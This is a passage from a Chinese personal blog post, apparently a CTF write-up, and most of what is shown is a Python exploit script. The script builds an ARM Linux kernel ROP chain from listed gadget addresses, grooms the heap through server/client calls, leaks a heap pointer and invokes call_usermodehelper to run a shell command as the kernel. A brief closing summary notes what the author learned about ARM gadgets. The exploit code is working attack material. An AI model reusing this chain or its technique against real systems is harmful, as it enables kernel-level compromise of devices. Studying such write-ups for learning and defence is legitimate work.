#0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack+<span class="number">4</span>*<span class="number">20</span>),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80427e38</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">16</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    payload=str_change(payload,p32(call_usermodehelper),stack+<span class="number">4</span>*<span class="number">18</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80427e38 &lt;call_with_stack+32&gt;:	ldr	sp, [sp, #4]</span></span><br><span class="line"><span class="string">    0x80427e3c &lt;call_with_stack+36&gt;:	bx	lr</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对标志控制不严格导致的漏洞类型有了比较深刻的印象，了解学习了arm指令集以及寻找gadget的思路。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
